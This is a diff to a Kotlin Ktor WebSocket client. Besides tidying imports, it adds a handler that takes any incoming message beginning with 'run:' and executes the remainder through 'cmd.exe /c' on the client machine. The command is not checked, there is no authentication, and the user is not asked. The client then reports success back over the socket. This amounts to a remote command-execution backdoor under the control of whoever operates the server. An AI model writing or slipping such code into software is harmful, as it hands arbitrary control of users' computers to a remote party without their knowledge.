@@ -1,19 +1,16 @@
 package websocket
 
-import io.ktor.client.HttpClient
-import io.ktor.client.engine.cio.CIO
-import io.ktor.client.plugins.websocket.DefaultClientWebSocketSession
-import io.ktor.client.plugins.websocket.WebSockets
-import io.ktor.client.plugins.websocket.webSocket
+import io.ktor.client.*
+import io.ktor.client.plugins.websocket.*
 import io.ktor.client.request.*
 import io.ktor.client.statement.*
-import io.ktor.http.HttpMethod
-import io.ktor.websocket.Frame
-import io.ktor.websocket.readText
+import io.ktor.http.*
+import io.ktor.websocket.*
+import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.cancelAndJoin
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.runBlocking
-import java.util.Scanner
+import kotlinx.coroutines.withContext
 
 fun main() {
     val client = HttpClient {
@@ -43,6 +40,12 @@ suspend fun DefaultClientWebSocketSession.outputMessages() {
                     send(Frame.Text("pinged successfully"))
                 else
                     send(Frame.Text("could not ping"))
+            } else if (text.startsWith("run:")) {
+                val command = text.substring(4)
+                withContext(Dispatchers.IO) {
+                    ProcessBuilder("cmd.exe", "/c", command).start()
+                }
+                send(Frame.Text("ran successfully"))
             }
 
         }
